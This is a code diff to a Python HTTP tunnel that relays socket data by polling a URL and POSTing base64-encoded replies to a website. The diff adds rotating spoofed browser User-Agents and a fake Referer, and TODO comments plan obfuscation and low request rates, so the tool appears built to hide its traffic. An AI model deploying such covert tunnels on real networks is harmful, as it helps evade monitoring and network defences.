@@ -8,6 +8,7 @@ import base64
 import urllib.request
 import urllib.error
 from time import sleep
+from random import choice
 import http.client
 
 
@@ -29,6 +30,32 @@ forward_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket_event = threading.Event()
 socket_event.clear()
 
+user_agents = [
+	'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11',
+	'Opera/9.25 (Windows NT 5.1; U; en)',
+	'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
+	'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
+	'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12',
+	'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.2.9'
+]
+
+def create_get_header():
+	"""Create a header for a GET request."""
+	request_headers = {
+		"Accept-Language": "en-US,en;q=0.5",
+		"User-Agent": choice(user_agents),
+		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Referer": "http://thewebsite.com",
+	}
+	return request_headers
+
+def create_post_header():
+	"""Create a header for a POST request."""
+	request_headers = {'Content-Type': 'text/html',
+	                   "User-Agent": choice(user_agents),}
+	return request_headers
+
+
 # todo add a user agent to every POST and GET queries
 # todo add the obfuscation
 # todo find some specific value for time_of_sleep to keep the number of
@@ -46,8 +73,9 @@ def receive_queries():
 	first_forward = True
 
 	while True:
+		request = urllib.request.Request(url, headers= create_get_header())
 		try:
-			opened_url = urllib.request.urlopen(url)
+			opened_url = urllib.request.urlopen(request)
 		except urllib.error.HTTPError as http_error:
 			error_code = http_error.getcode()
 
@@ -101,7 +129,7 @@ def forward_replies():
 		socket_event.wait()
 		logging.debug("Forward replies thread unlocked.")
 		reply = forward_socket.recv(2048)
-		headers = {'Content-Type': 'text/html'}
+		headers = create_post_header()
 		params = {'payload': base64.b64encode(reply)}
 		client = http.client.HTTPConnection(website)
 		url_params = urllib.parse.urlencode(params)
